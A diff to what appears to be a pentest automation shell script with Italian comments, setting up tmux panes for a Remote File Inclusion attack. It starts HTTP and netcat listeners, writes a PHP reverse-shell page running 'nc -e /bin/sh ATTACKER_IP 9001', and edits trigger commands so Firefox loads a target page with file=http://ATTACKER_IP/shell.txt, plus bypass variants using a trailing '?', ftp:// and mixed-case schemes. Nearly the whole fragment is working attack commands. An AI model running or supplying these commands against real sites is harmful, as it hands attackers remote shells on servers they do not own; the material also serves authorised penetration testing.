@@ -3342,6 +3342,7 @@ tmux split-window -h -t "6.6"
 tmux split-window -h -t "6.6"
 tmux split-window -h -t "6.6"
 tmux split-window -h -t "6.6"
+tmux split-window -h -t "6.6"
 # Esecuzione dei comandi nelle sottofinestre
 tmux send-keys -t PT:6.0"# RFI - HTTP listener" Enter
 tmux send-keys -t PT:6.0 "python3 -m http.server 80"
@@ -3366,13 +3367,13 @@ tmux send-keys -t PT:6.6 "nc -nlvp 9001"
 tmux send-keys -t PT:6.7"# RFI - prepare a reverse shell on PHP page" Enter
 tmux send-keys -t PT:6.7 "rm -f shell.txt && echo \"<?php passthru(\\\"nc -e /bin/sh ATTACKER_IP 9001\\\"); ?>\" > shell.txt && python3 -m http.server 80"
 tmux send-keys -t PT:6.8"# RFI - activate reverse shell" Enter
-tmux send-keys -t PT:6.8 "http://$site/page-RFI.php?file=http://ATTACKER_IP/shell.txt"
+tmux send-keys -t PT:6.8 "firefox http://$site/page-RFI.php?file=http://ATTACKER_IP/shell.txt &"
 tmux send-keys -t PT:6.9"# RFI - activate reverse shell" Enter
-tmux send-keys -t PT:6.9 "http://$site/page-RFI.php?file=http://ATTACKER_IP/shell.txt?"
+tmux send-keys -t PT:6.9 "firefox http://$site/page-RFI.php?file=http://ATTACKER_IP/shell.txt? &"
 tmux send-keys -t PT:6.10"# RFI - activate reverse shell" Enter
-tmux send-keys -t PT:6.10 "http://$site/page-RFI.php?file=ftp://ATTACKER_IP/shell.txt"
+tmux send-keys -t PT:6.10 "firefox http://$site/page-RFI.php?file=ftp://ATTACKER_IP/shell.txt &"
 tmux send-keys -t PT:6.11"# RFI - activate reverse shell" Enter
-tmux send-keys -t PT:6.11 "http://$site/page-RFI.php?file=hTTp://ATTACKER_IP/shell.txt"
+tmux send-keys -t PT:6.11 "firefox http://$site/page-RFI.php?file=hTTp://ATTACKER_IP/shell.txt &"
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
